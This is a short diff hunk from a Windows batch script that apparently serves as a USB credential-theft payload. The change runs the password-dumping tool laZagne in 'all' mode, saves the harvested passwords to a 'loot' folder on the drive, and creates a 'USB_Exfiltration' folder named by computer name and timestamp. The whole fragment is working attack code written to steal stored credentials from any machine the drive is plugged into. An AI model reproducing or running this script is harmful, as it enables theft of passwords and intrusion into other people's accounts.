@@ -9,7 +9,7 @@ REM %~d0 = path to this batch file. %COMPUTERNAME%, %date% and %time% pretty obv
 
 setlocal
 cd /d %~dp0
-%~dp0\laZagne.exe -oN > %~d0\loot\passwords.txt
+%~dp0\laZagne.exe all > %~dp0\..\..\loot\passwords.txt
 
 set dst=%~dp0\..\..\loot\USB_Exfiltration\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
 mkdir %dst% >>nul
